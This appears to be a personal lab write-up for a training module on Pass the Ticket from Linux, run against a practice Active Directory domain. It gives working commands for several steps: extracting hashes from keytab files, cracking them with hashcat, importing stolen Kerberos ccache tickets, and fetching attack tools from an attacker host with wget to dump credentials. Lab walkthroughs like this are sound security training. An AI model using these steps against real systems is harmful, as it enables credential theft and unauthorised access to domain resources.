# [[Pass the Ticket (PtT) from Linux]]

### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
![[Screenshot 2026-05-11 at 14.36.46.png]]

```shell
ssh david@inlanefreight.htb@10.129.82.146 -p 2222
```
![[Screenshot 2026-05-11 at 15.03.12.png]]
### Which group can connect to LINUX01?

```shell
realm list
```
![[Screenshot 2026-05-11 at 15.05.49.png]]
### Look for a keytab file that you have read and write access. Submit the file name as a response.

```shell
find / -name '*keytab*' -ls 2>/dev/null
```
![[Screenshot 2026-05-11 at 15.10.48.png]]
### Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

Attacker
```shell
git clone <https://github.com/sosdave/KeyTabExtract>  
cd KeyTabExtract
python -m http.server 8888
```

Victim
```shell
wget http://10.10.14.56:8888/keytabextract.py
python3 keytabextract.py /opt/specialfiles/carlos.keytab
```
![[Screenshot 2026-05-11 at 15.19.05.png]]

```shell
hashcat -a 0 -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
```
![[Screenshot 2026-05-11 at 15.20.03.png]]
![[Screenshot 2026-05-11 at 15.22.03.png]]
### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

```shell
crontab -l
```
![[Screenshot 2026-05-11 at 15.23.01.png]]

```shell
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```
![[Pasted image 20260511152613.png]]

```shell
python3 keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```
![[Screenshot 2026-05-11 at 15.25.14.png]]

```shell
find / -name '*.kt*' 2>/dev/null
```
![[Screenshot 2026-05-11 at 15.28.00.png]]

```shell
python3 keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```
![[Screenshot 2026-05-11 at 15.28.18.png]]

```shell
hashcat -a 0 -m 1000 7247e8d4387e76996ff3f18a34316fdd /usr/share/wordlists/rockyou.txt
```
![[Screenshot 2026-05-11 at 15.29.14.png]]

```shell
ssh svc_workstations@inlanefreight.htb@10.129.82.146 -p 2222
```
![[Screenshot 2026-05-11 at 15.36.59.png]]
### Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
![[Screenshot 2026-05-11 at 16.02.09.png]]
### Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

```shell
ls -lah /tmp
```
![[Screenshot 2026-05-11 at 15.38.14.png]]

```shell
export krb5cc_647401106_HRJDux
klist
```
![[Screenshot 2026-05-11 at 15.40.31.png]]
![[Screenshot 2026-05-11 at 15.42.34.png]]

```shell
export KRB5CCNAME=krb5cc_647401106_tiPak9
```

```shell
smbclient //DC01/julio -N  
ls  
get julio.txt  
exit
```
### Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

Attacker machine
```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
python -m http.server 1234
```

Victim machine
```shell
wget http://10.10.14.56:1234/linikatz.sh
./linikatz.sh
```
![[Screenshot 2026-05-11 at 16.06.03.png]]

```shell
/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
klist
```
![[Screenshot 2026-05-11 at 16.07.50.png]]

```shell
smbclient //DC01/linux01 -N
```
![[Screenshot 2026-05-11 at 16.10.03.png]]